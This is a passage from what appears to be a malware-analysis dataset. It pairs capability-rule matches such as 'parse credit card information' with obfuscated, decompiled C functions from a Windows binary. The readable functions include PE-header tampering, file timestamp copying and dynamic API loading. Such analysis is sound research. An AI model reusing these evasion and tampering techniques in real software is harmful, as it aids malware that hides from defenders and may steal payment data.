WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    while( true ) {\n        fcn.004010e0(0x407014, 0x11, 0x4112b8, 0xe);\n        fcn.004010e0(0x407014, 0x11, 0x4112c8, 0xb);\n        bVar15 = false;\n        bVar24 = false;\n        bVar16 = (unaff_EBX & extraout_CX) == 0;\n        fcn.004010e0(0x407014, 0x11, 0x4112d4, 0xb);\n        if ((bVar15 || bVar16) || (!bVar15 && !bVar16)) break;\n        if (!bVar24) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    fcn.004010e0(0x407014, 0x11, 0x4112e0, 0xb);\n    uVar25 = 0;\n    uVar21 = 0;\n    bVar15 = (extraout_DL & 0x66) == 0;\n    uVar3 = (POPCOUNT(extraout_DL & 0x66) & 1U) == 0;\n    fcn.004010e0(0x407014, 0x11, 0x4112ec, 10);\n    if ((!bVar15) && (bVar15)) {\n        uVar25 = ((uVar25 & 1) * 0x800 & 0x800) != 0;\n        bVar22 = ((in_IF & 1) * 0x200 & 0x400) != 0;\n        uVar21 = (uVar21 * -0x80 | (bVar15 & 1U) * '@' & 0x80) != 0;\n        in_AF = ((in_AF & 1) * '\\x10' & 0x10) != 0;\n        uVar3 = ((uVar3 & 1) * '\\x04' & 4) != 0;\n    }\n    uVar34 = 0x12f8;\n    uVar35 = 0x41;\n    uVar30 = 0x11;\n    uVar36 = 0;\n    uVar5 = 0x7014;\n    uVar27 = 0x40;\n    uVar6 = fcn.004010e0(0x407014, 0x11, 0x4112f8, 0xc);\n    if ((uVar25 == uVar21) && (uVar25 != uVar21)) {\n        puVar10 = puVar10 + -1;\n        pcVar13 = puVar14 | uVar9;\n        puVar14 = pcVar13 + bVar22 * -2 + 1;\n        *pcVar13 = uVar6;\n        uVar3 = (POPCOUNT(uVar6 + (uVar6 >> 8) * 'y') & 1U) == 0;\n        in_SS = uVar5;\n        uVar5 = in_ES;\n    }\n    uVar6 = 0x11;\n    uVar33 = 0;\n    fcn.004010e0(0x407014, CONCAT22(uVar27, uVar5), CONCAT22(uVar36, uVar30), CONCAT22(uVar35, uVar34));\n    if (uVar3) {\ncode_r0x004022ff:\n        uVar5 = 0x11;\n        uVar27 = 0;\n        uVar6 = 0x1314;\n        uVar33 = 0x41;\n    }\n    else {\n        uVar5 = SUB42(puVar14, 0);\n        uVar27 = puVar14 >> 0x10;\n        if (!uVar3) goto code_r0x004022ff;\n        puVar10 = 0x34a96cf4;\n        *(extraout_EDX_00 + 0x15) = *(extraout_EDX_00 + 0x15) + *0x6a17b43a;\n    }\n    fcn.004010e0(0x407014, 0x11, CONCAT22(uVar33, uVar6), CONCAT22(uVar27, uVar5));\n    iVar7 = fcn.004010e0(0x407014, 0x11, 0x411328, 0x13);\n    uVar3 = (unaff_EBX ^ 0x70c5) - iVar7 >> 8 | extraout_CX_00 >> 8;\n    uVar21 = extraout_CX_00;\n    uVar18 = SBORROW1(uVar3, uVar21);\n    cVar20 = uVar3 - uVar21 < '\\0';\n    uVar4 = uVar3 == uVar21;\n    while( true ) {\n        fcn.004010e0(0x407014, 0x11, 0x41133c, 0x14);\n        uVar26 = 0x407014;\n        uVar3 = fcn.004010e0(0x407014, 0x11, 0x411350, 0x33);\n        if ((uVar4 || uVar18 != cVar20) || (!uVar4 && uVar18 == cVar20)) break;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        if (!uVar18) {\n            pcVar2 = swi(4);\n            uVar5 = extraout_DX_00;\n            if (SCARRY1(uVar3 + in_AF * '\\x06' & 0xf, '\\0') == true) {\n                (*pcVar2)();\n                uVar5 = extraout_DX;\n            }\n            in(uVar5);\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n    }\n    uVar30 = 10;\n    uVar36 = 0;\n    uVar5 = 0x1384;\n    uVar27 = 0x41;\n    fcn.004010e0(0x407014, 0x11, 0x411384, 10);\n    if (uVar18) {\ncode_r0x004023af:\n        uVar34 = 4;\n        uVar35 = 0;\n        uVar6 = 0x1390;\n        uVar33 = 0x41;\n    }\n    else {\n        uVar34 = extraout_ECX_01;\n        uVar35 = extraout_ECX_01 >> 0x10;\n        if (!uVar18) goto code_r0x004023af;\n        *puVar14 = *puVar10;\n    }\n    fcn.004010e0(0x407014, 0x11, CONCAT22(uVar33, uVar6), CONCAT22(uVar35, uVar34));\n    uVar9 = fcn.004010e0(0x407014, 0x11, 0x411394, 5);\n    bVar22 = uVar9 < 0x6e32;\n    uVar4 = (POPCOUNT(uVar9 - 0x6e32 & 0xff) & 1U) == 0;\n    fcn.004010e0(0x407014, 0x11, 0x41139c, 6);\n    if ((uVar4) || (!uVar4)) {\ncode_r0x00402439:\n        fcn.004010e0(0x407014, 0x11, 0x4113d0, 0x2a);\n        if (!uVar4) {\n            uVar30 = extraout_ECX_02;\n            uVar36 = extraout_ECX_02 >> 0x10;\n            if (uVar4) {\n                *(extraout_EDX_01 + 0xb) = *(extraout_EDX_01 + 0xb) + -0x68;\n                goto code_r0x0040245f;\n            }\n        }\n        uVar30 = 0xb;\n        uVar36 = 0;\n    }\n    else {\n        segment(in_SS, *0x10 + 6);\n        if (!bVar22) {\n            if (uVar4) {\n    // WARNING: Bad instruction - Truncating control flow here\n                halt_baddata();\n            }\n            uVar4 = (POPCOUNT(&stack0x0000000a & 0xff) & 1U) == 0;\n            goto code_r0x00402439;\n        }\n    }\n    uVar5 = 0x13fc;\n    uVar27 = 0x41;\ncode_r0x0040245f:\n    fcn.004010e0(0x407014, 0x11, CONCAT22(uVar27, uVar5), CONCAT22(uVar36, uVar30));\n    return;\n}\n",
        "token_count": 4374
    },
    "00402bd0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402de4) overlaps instruction at (ram,0x00402de1)\n// \n// WARNING: Removing unreachable block (ram,0x00402e07)\n// WARNING: Removing unreachable block (ram,0x00402e1c)\n// WARNING: Removing unreachable block (ram,0x00402e26)\n\nvoid __cdecl fcn.00402bd0(uchar *arg_8h, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    int32_t *piVar3;\n    char cVar4;\n    uint32_t in_EAX;\n    uint32_t uVar5;\n    uint16_t uVar6;\n    uint *in_EDX;\n    uint32_t unaff_EBX;\n    uint *puVar7;\n    uint *puVar8;\n    uint *puVar9;\n    uint32_t unaff_ESI;\n    uint32_t uVar10;\n    uchar *unaff_EDI;\n    ushort in_SS;\n    bool bVar11;\n    bool bVar12;\n    uint8_t in_AF;\n    bool bVar13;\n    char in_SF;\n    char in_OF;\n    uint uStack24;\n    uint16_t uStack20;\n    \n    puVar7 = &stack0xfffffffc;\n    puVar9 = &stack0xfffffffc;\n    uVar5 = in_EAX;\n    uVar10 = unaff_ESI;\n    if (((in_OF == in_SF) && (in_OF != in_SF)) &&\n       (uVar5 = unaff_ESI,  uVar10 = in_EAX,  arg_8h = unaff_EDI,  -1 < &stack0xfffffff0)) {\n        xabort(0x2a);\n    }\n    while( true ) {\n        *arg_8h = 0x14;\n        uStack20 = uVar5;\n        arg_8h[1] = 0x70;\n        arg_8h[2] = 0x5a;\n        bVar11 = (uVar10 | 0x561b) < in_EDX;\n        uVar5 = (uVar10 | 0x561b) - in_EDX;\n        bVar13 = uVar5 == 0;\n        bVar12 = (POPCOUNT(uVar5 & 0xff) & 1U) == 0;\n        arg_8h[3] = 0x50;\n        if ((bVar12) || (!bVar12)) goto code_r0x00402c75;\n        piVar3 = segment(in_SS, *0x10 + -0x10);\n        in_EDX = 0xb7bc9ea5;\n        if (bVar11) goto code_r0x00402d01;\n        if (!bVar12) break;\n        uVar5 = *piVar3 + unaff_EBX;\n    }\n    bVar13 = *0x10 == 0xc;\ncode_r0x00402c75:\n    arg_8h[4] = 0x3c;\n    puVar9 = &stack0xfffffffc;\n    if ((!bVar13) && (puVar9 = &stack0xfffffffc,  bVar13)) {\n        puVar8 = &uStack20;\n        puVar9 = &uStack20;\n        cVar4 = '\\x10';\n        do {\n            puVar7 = puVar7 + -1;\n            puVar8 = puVar8 + -1;\n            *puVar8 = *puVar7;\n            cVar4 = cVar4 + -1;\n        } while ('\\0' < cVar4);\n    }\n    arg_8h[5] = 0x39;\n    iVar1 = *(puVar9 + 8);\n    *(iVar1 + 6) = 0x6f;\n    uStack20 = iVar1;\n    uVar10 = *(puVar9 + 8);\n    *(uVar10 + 7) = 0xfb;\n    *(uVar10 + 8) = 0xc1;\n    *(uVar10 + 9) = 0x5d;\ncode_r0x00402d01:\n    while( true ) {\n        *(uVar10 + 10) = 0x2f;\n        *(uVar10 + 0xb) = 0x78;\n        *(uVar10 + 0xc) = 0x4f;\n        *(uVar10 + 0xd) = 0xe3;\n        *(*(puVar9 + 8) + 0xe) = 0x52;\n        iVar1 = *(puVar9 + 8);\n        *(iVar1 + 0xf) = 0x32;\n        *(iVar1 + 0x10) = 0xf8;\n        bVar11 = (uStack20 & 0x11cb) == 0;\n        *(iVar1 + 0x11) = 0xa3;\n        if ((!bVar11) && (bVar11)) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(iVar1 + 0x12) = 0x1e;\n        *(iVar1 + 0x13) = 0xe5;\n        *(iVar1 + 0x14) = 0xd8;\n        iVar2 = *(puVar9 + 8);\n        *(iVar2 + 0x15) = 0x5b;\n        uVar6 = iVar1 - 1U & arg_8h | 0x61be;\n        bVar11 = (POPCOUNT(uVar6 & 0xff) & 1U) == 0;\n        *(iVar2 + 0x16) = 0x2e;\n        if ((uVar6 < 1) || (0 < uVar6)) break;\n        in_AF = 9 < (iVar2 & 0xf) | in_AF;\n        if (iVar1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n        *(uVar10 + 0x23) = &uStack20 + in_AF + *(uVar10 + 0x23);\n    }\n    *(iVar2 + 0x17) = 0x52;\n    if ((bVar11) || (!bVar11)) {\n        in_EDX = *(puVar9 + 0xc);\n        unaff_EBX = unaff_ESI;\n    }\n    *(unaff_EBX + 0x5e5f0c55) = *(unaff_EBX + 0x5e5f0c55) | 0x5b;\n    *in_EDX = 0x18;\n    return;\n}\n",
        "token_count": 1486
    },
    "004035a0": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004035cc) overlaps instruction at (ram,0x004035cb)\n// \n// WARNING: Removing unreachable block (ram,0x00403640)\n// WARNING: Removing unreachable block (ram,0x00403648)\n// WARNING: Removing unreachable block (ram,0x0040364b)\n// WARNING: Removing unreachable block (ram,0x004035cc)\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint64_t __cdecl fcn.004035a0(int16_t *arg_8h)\n\n{\n    int32_t iVar1;\n    uint8_t extraout_CL;\n    uint32_t in_EDX;\n    uint extraout_EDX;\n    uint *puVar2;\n    uchar *unaff_ESI;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint *puVar6;\n    bool bVar7;\n    uint64_t uVar8;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    if ((*0x10 != 0xc) && (*0x10 == 0xc)) {\n        out(*unaff_ESI, in_EDX);\n    }\n    if (*arg_8h != 0x5a4d) {\n        return in_EDX << 0x20;\n    }\n    if (*(*(arg_8h + 0x1e) + arg_8h) != 0x4550) {\n        return in_EDX << 0x20;\n    }\n    if ((*(arg_8h + 0x1e) + arg_8h)[0x16] != 0) {\n        return in_EDX << 0x20;\n    }\n    var_4h = 0x40;\n    bVar7 = *(arg_8h + 0x1e) != 0x80;\n    if (*(arg_8h + 0x1e) < 0x81) {\n        return in_EDX << 0x20;\n    }\n    piVar3 = arg_8h;\n    if ((bVar7) && (!bVar7)) {\n        piVar3 = arg_8h + 1;\n        out(*arg_8h, in_EDX);\n    }\n    uVar4 = *(piVar3 + 0x1e);\n    bVar7 = SBORROW4(uVar4, 0xc0);\n    if (uVar4 < 0xc0) {\n        bVar7 = SCARRY4(uVar4, -0x80);\n        uVar4 = uVar4 - 0x80;\n        var_4h = uVar4;\n    }\n    if ((!bVar7) && (bVar7)) {\n        LOCK();\n        uVar4 = 0x138b2633;\n    }\n    uVar8 = sub.MSVCRT.dll_void____cdecl_operator_new_unsigned_int_(var_4h);\n    puVar6 = uVar8;\n    if (puVar6 == NULL) {\n        return uVar8 & 0xffffffff00000000;\n    }\n    if ((puVar6 < 1) || (0 < puVar6)) {\n        uVar4 = 0;\n        puVar2 = puVar6;\n        if (var_4h == 0) goto code_r0x00403712;\n    }\n    else {\n        *(puVar6 + 0x3339da56) = *(puVar6 + 0x3339da56) ^ extraout_CL;\n        puVar2 = puVar6 + 1;\n    }\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_rand)();\n        uVar5 = uVar4 + 1;\n        *(uVar4 + puVar2) = iVar1 % 0xff;\n        uVar4 = uVar5;\n    } while (uVar5 < var_4h);\ncode_r0x00403712:\n    puVar2 = arg_8h + 0x40;\n    for (uVar4 = var_4h >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar2 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar2 = puVar2 + 1;\n    }\n    for (var_4h = var_4h & 3; var_4h != 0; var_4h = var_4h - 1) {\n        *puVar2 = *puVar6;\n        puVar6 = puVar6 + 1;\n        puVar2 = puVar2 + 1;\n    }\n    sub.MSVCRT.dll_void___cdecl_operator_delete_void__(uVar8);\n    return CONCAT44(extraout_EDX, 1);\n}\n",
        "token_count": 1063
    },
    "00404d40": {
        "rules": [
            "parse credit card information/0fcc6283562247e58776c7b51a92f681"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404ec8) overlaps instruction at (ram,0x00404ec7)\n// \n// WARNING: Removing unreachable block (ram,0x00404f62)\n// WARNING: Removing unreachable block (ram,0x00404f87)\n// WARNING: Removing unreachable block (ram,0x00404f89)\n// WARNING: Removing unreachable block (ram,0x00404ddf)\n\nulong __fastcall fcn.00404d40(uint32_t param_1, uchar *param_2)\n\n{\n    int32_t iVar1;\n    char cVar2;\n    uint8_t uVar3;\n    uint16_t uVar4;\n    uint32_t in_EAX;\n    uint uVar5;\n    uint32_t uVar6;\n    uint8_t uVar7;\n    uint32_t uVar8;\n    int32_t unaff_EBX;\n    uint32_t uVar9;\n    uint *puVar10;\n    uint *puVar11;\n    uint *puVar12;\n    int32_t unaff_ESI;\n    int32_t *unaff_EDI;\n    uchar *puVar13;\n    ushort in_SS;\n    bool in_PF;\n    uint8_t in_AF;\n    bool bVar14;\n    bool bVar15;\n    bool bVar16;\n    int32_t in_stack_5f9dff5f;\n    uint auStack24 [2];\n    \n    puVar11 = &stack0xfffffffc;\n    if ((!in_PF) && (puVar11 = &stack0xfffffffc,  in_PF)) {\n        iVar1 = *unaff_EDI;\n        *unaff_EDI = unaff_ESI;\n        puVar11 = &stack0xfffffffc + -in_stack_5f9dff5f;\n        if (puVar11 < 0) {\n    // WARNING: Bad instruction - Truncating control flow here\n            halt_baddata();\n        }\n        puVar12 = puVar11;\n        if (-1 < iVar1) goto code_r0x00404dbc;\n    }\n    param_2 = puVar11[2];\n    *param_2 = 0x17;\n    in_EAX = (in_EAX >> 8 & 0xffff00) << 8 | in_EAX & 0xffff;\n    param_2[1] = 0xa7;\n    puVar13 = param_1 & 0xffff0000 | CONCAT11((param_1 >> 8) - unaff_EBX, param_1);\n    bVar16 = SBORROW4(puVar13, param_2);\n    bVar15 = puVar13 - param_2 < 0;\n    bVar14 = puVar13 == param_2;\n    param_1 = puVar11[2];\n    *(param_1 + 2) = 0x5b;\n    puVar12 = puVar11;\n    if ((!bVar14) && (bVar14)) {\n        puVar10 = auStack24 + 1;\n        puVar12 = auStack24 + 1;\n        cVar2 = '\\x10';\n        do {\n            puVar11 = puVar11 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar11;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n    }\n    *(param_1 + 3) = 6;\n    if (puVar13 <= param_2) goto code_r0x00404db8;\n    while( true ) {\n        if (bVar14 || bVar16 != bVar15) {\n            uVar3 = 9 < (in_EAX & 0xf) | in_AF;\n            if (param_1 != 0) {\n                do {\n    // WARNING: Do nothing block with infinite loop\n                } while( true );\n            }\n            return CONCAT44(param_2, in_EAX & 0xffff0000 |\n                                     CONCAT11((in_EAX >> 8) + uVar3, in_EAX + uVar3 * '\\x06') & 0xff0f);\n        }\ncode_r0x00404db8:\n        *(param_1 + 4) = 0xe6;\ncode_r0x00404dbc:\n        *(param_1 + 5) = 0x11;\n        *(param_1 + 6) = 0xde;\n        uVar4 = in_EAX + unaff_EBX | 0x11a9;\n        bVar15 = uVar4 < 0;\n        bVar14 = uVar4 == 0;\n        *(param_1 + 7) = 0x7b;\n        uVar3 = in_EAX;\n        if ((uVar4 < 1) || (0 < uVar4)) {\n            *(param_1 + 8) = 0xc5;\n        }\n        else {\n            uVar7 = param_1 >> 8 | uVar3;\n            param_1 = param_1 & 0xffff0000 | CONCAT11(uVar7, param_1);\n            bVar15 = uVar7 < '\\0';\n            bVar14 = uVar7 == 0;\n        }\n        bVar16 = false;\n        if ((bVar14 || bVar15 != false) || (!bVar14 && bVar15 == false)) break;\n        in_AF = 9 < (uVar3 & 0xf) | in_AF;\n        in_EAX = in_EAX & 0xffff0000 | CONCAT11((in_EAX >> 8) + in_AF, uVar3 + in_AF * '\\x06') & 0xff0f;\n        if (param_1 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    *(param_1 + 9) = 0xf1;\n    uVar8 = puVar12[2];\n    *(uVar8 + 10) = 3;\n    uVar6 = in_EAX & 0xffff;\n    *(uVar8 + 0xb) = 0xfe;\n    uVar9 = unaff_EBX + 1;\n    bVar14 = (POPCOUNT(uVar9 & 0xff) & 1U) == 0;\n    *(uVar8 + 0xc) = 0xac;\n    if ((!bVar14) && (bVar14)) {\n        puVar11 = auStack24 + 1;\n        cVar2 = '\\x1e';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar12;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar5 = in(0x78);\n        return CONCAT44(uVar8, uVar5);\n    }\n    *(uVar8 + 0xd) = 0x33;\n    if ((uVar9 != 0) && (uVar9 == 0)) {\ncode_r0x00404ea0:\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    *(uVar8 + 0xe) = 0x98;\n    if ((!bVar14) && (bVar14)) {\n        puVar11 = auStack24 + 1;\n        cVar2 = '\\x1e';\n        do {\n            puVar12 = puVar12 + -1;\n            puVar11 = puVar11 + -1;\n            *puVar11 = *puVar12;\n            cVar2 = cVar2 + -1;\n        } while ('\\0' < cVar2);\n        uVar5 = in(0x78);\n        return CONCAT44(uVar8, uVar5);\n    }\n    *(uVar8 + 0xf) = 0x70;\n    if (SCARRY4(unaff_EBX, 1) != uVar9 < 0) goto code_r0x00404ee2;\n    if (SCARRY4(unaff_EBX, 1) == uVar9 < 0) goto code_r0x00404ee2;\n    uVar8 = uVar8 & 0xffffff00;\n    in_SS = SUB42(unaff_EDI, 0);\n    do {\n        puVar13 = unaff_EDI | puVar12;\n        unaff_EDI = puVar13 + 1;\n        *puVar13 = uVar6;\n        uVar8 = uVar8 & 0xffffff00;\ncode_r0x00404ee2:\n        *(uVar8 + 0x10) = 0xff;\n        bVar14 = (POPCOUNT((param_1 - 1U & unaff_EDI | 0x61be) & 0xff) & 1U) == 0;\n        *(uVar8 + 0x11) = 0x7c;\n        if ((!bVar14) && (bVar14)) {\n            segment(in_SS, *0x10 + -0x10);\n            uVar8 = 0xb7bc9ea5;\n            if (bVar14) goto code_r0x00404ea0;\n            bVar14 = (POPCOUNT(&stack0xfffffff4 & 0xff) & 1U) == 0;\n        }\n        *(uVar8 + 0x12) = 0x3a;\n        if ((bVar14) || (!bVar14)) goto code_r0x00404f41;\n        puVar11 = segment(in_SS, *0x10 + -0x10);\n        uVar5 = *puVar11;\n        uVar8 = 0xb7bc9ea5;\n        if (!bVar14) {\n            uVar8 = 0xb7bc9ea5;\ncode_r0x00404f41:\n            *(uVar8 + 0x13) = 0x4d;\n            puVar11 = puVar12[3];\n            *puVar11 = 0x14;\n            return CONCAT44(uVar8, puVar11);\n        }\n        *(unaff_EDI + -0x41) = *(unaff_EDI + -0x41) + 0x4843615b;\n        uVar6 = CONCAT11(0x13, uVar5) + 0x18107d5f;\n    } while( true );\n}\n",
        "token_count": 2308
    },
    "004011a0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nulong __cdecl fcn.004011a0(uint arg_8h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar **ppuVar4;\n    uchar **ppuVar5;\n    bool in_ZF;\n    uchar *apuStack12 [2];\n    \n    puVar3 = &stack0xfffffffc;\n    ppuVar5 = &stack0xfffffffc;\n    if ((!in_ZF) && (ppuVar5 = &stack0xfffffffc,  in_ZF)) {\n        ppuVar4 = apuStack12 + 1;\n        ppuVar5 = apuStack12 + 1;\n        apuStack12[1] = &stack0xfffffffc;\n        cVar1 = '\\x10';\n        do {\n            puVar3 = puVar3 + -1;\n            ppuVar4 = ppuVar4 + -1;\n            *ppuVar4 = *puVar3;\n            cVar1 = cVar1 + -1;\n        } while ('\\0' < cVar1);\n    }\n    iVar2 = (*_sym.imp.MSVCRT.dll__access)(*(ppuVar5 + 8));\n    if (iVar2 == -1) {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 286
    },
    "00401730": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nuint __cdecl fcn.00401730(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint *puVar5;\n    char *pcVar6;\n    char *pcVar7;\n    char *pcVar8;\n    uint *puVar9;\n    char lpBuffer;\n    uint var_22fh;\n    uchar var_12ch;\n    uint var_12bh;\n    uint var_28h;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint var_14h;\n    int32_t hFile;\n    \n    hFile = arg_ch;\n    lpBuffer = '\\0';\n    puVar5 = &var_22fh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    var_12ch = '\\0';\n    puVar5 = &var_12bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar5 = 0;\n        puVar5 = puVar5 + 1;\n    }\n    *puVar5 = 0;\n    *(puVar5 + 2) = 0;\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)();\n    uVar3 = 0xffffffff;\n    pcVar7 = &lpBuffer;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = &var_12ch;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    uVar3 = 0xffffffff;\n    pcVar7 = 0x4111c0;\n    do {\n        pcVar6 = pcVar7;\n        if (uVar3 == 0) break;\n        uVar3 = uVar3 - 1;\n        pcVar6 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar6;\n    } while (cVar1 != '\\0');\n    uVar3 = ~uVar3;\n    iVar2 = -1;\n    pcVar7 = &var_12ch;\n    do {\n        pcVar8 = pcVar7;\n        if (iVar2 == 0) break;\n        iVar2 = iVar2 + -1;\n        pcVar8 = pcVar7 + 1;\n        cVar1 = *pcVar7;\n        pcVar7 = pcVar8;\n    } while (cVar1 != '\\0');\n    puVar5 = pcVar6 + -uVar3;\n    puVar9 = pcVar8 + -1;\n    for (uVar4 = uVar3 >> 2; uVar4 != 0; uVar4 = uVar4 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    for (uVar3 = uVar3 & 3; uVar3 != 0; uVar3 = uVar3 - 1) {\n        *puVar9 = *puVar5;\n        puVar5 = puVar5 + 1;\n        puVar9 = puVar9 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetFileAttributesExA)();\n    if ((arg_ch == -1) && (hFile = fcn.00402fb0(arg_8h),  hFile == -1)) {\n        return 0;\n    }\n    iVar2 = hFile;\n    (*_sym.imp.KERNEL32.dll_SetFileTime)(hFile, &lpCreationTime, &lpLastAccessTime, &var_14h);\n    if (arg_ch == -1) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar2);\n    }\n    return 1;\n}\n",
        "token_count": 1135
    },
    "00401ec0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00401ee3) overlaps instruction at (ram,0x00401ee0)\n// \n\nuint fcn.00401ec0(void)\n\n{\n    int32_t iVar1;\n    bool bVar2;\n    \n    iVar1 = fcn.00402fb0(0x411188);\n    bVar2 = iVar1 == -1;\n    if (bVar2) {\n        return 0;\n    }\n    if ((bVar2) || (!bVar2)) {\n        (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar1);\n    }\n    return 1;\n}\n",
        "token_count": 136
    },
    "00403270": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032a2) overlaps instruction at (ram,0x004032a1)\n// \n// WARNING: Removing unreachable block (ram,0x004032a2)\n\nbool fcn.00403270(void)\n\n{\n    uint in_EAX;\n    int32_t iVar1;\n    uint *unaff_EDI;\n    uchar auStack272 [260];\n    uchar auStack12 [4];\n    uint uStack8;\n    \n    uStack8 = 0x104;\n    if ((0x10b < &stack0xfffffffc) && (SBORROW4(&stack0xfffffffc, 0x10c) != auStack272 < 0)) {\n        out(0xc4, in_EAX);\n        *unaff_EDI = in_EAX;\n    }\n    iVar1 = fcn.004050a0(0x80000002, 0x411468, 0x4114a8, auStack12, auStack272, &uStack8);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.MSVCRT.dll__access)(auStack272, 0);\n        return iVar1 != -1;\n    }\n    return false;\n}\n",
        "token_count": 269
    },
    "004043b0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1",
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\n// WARNING: Control flow encountered bad instruction data\n// WARNING: Instruction at (ram,0x00404520) overlaps instruction at (ram,0x0040451f)\n// \n// WARNING: Removing unreachable block (ram,0x00404510)\n// WARNING: Removing unreachable block (ram,0x00404515)\n// WARNING: Removing unreachable block (ram,0x0040458b)\n// WARNING: Variable defined which should be unmapped: var_4h\n// WARNING: Variable defined which should be unmapped: hObject\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004043b0(uint arg_8h)\n\n{\n    uint8_t *puVar1;\n    uint *puVar2;\n    char cVar3;\n    uint8_t uVar4;\n    code *pcVar5;\n    uint32_t uVar6;\n    uint uVar7;\n    char *pcVar8;\n    int32_t iVar9;\n    uint8_t *extraout_ECX;\n    int32_t iVar10;\n    ushort uVar11;\n    uint unaff_EBX;\n    uint *unaff_EBP;\n    uint *puVar12;\n    uchar uVar13;\n    bool bVar14;\n    unkbyte6 Var15;\n    uint var_130h;\n    uint var_12ch;\n    uint var_128h;\n    uint var_10ch;\n    uchar uStack36;\n    ushort uStack35;\n    uint uStack33;\n    uchar uStack29;\n    uchar uStack28;\n    ushort uStack27;\n    uchar uStack25;\n    int32_t iStack24;\n    uint hObject;\n    uint var_4h;\n    \n    uStack33 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)();\n    puVar12 = _sym.imp.KERNEL32.dll_GetProcAddress;\n    if (uStack33 == 0) {\n        return 0;\n    }\n    bVar14 = false;\n    uVar13 = 0;\n    uStack28 = 0xf7;\n    uStack27 = 0x4043;\n    uStack25 = 0;\n    iStack24 = uStack33;\n    Var15 = (*_sym.imp.KERNEL32.dll_GetProcAddress)();\n    uVar11 = Var15 >> 0x20;\n    pcVar5 = Var15;\n    *0x422628 = pcVar5;\n    if (!bVar14) {\n        uStack28 = SUB41(puVar12, 0);\n        uStack27 = puVar12 >> 8;\n        uStack25 = puVar12 >> 0x18;\n        if (bVar14) {\n            puVar2 = puVar12 + 1;\n            uVar7 = in(uVar11);\n            *puVar12 = uVar7;\n            if (&iStack24 < 1) {\n                uVar4 = in(uVar11);\n                pcVar8 = 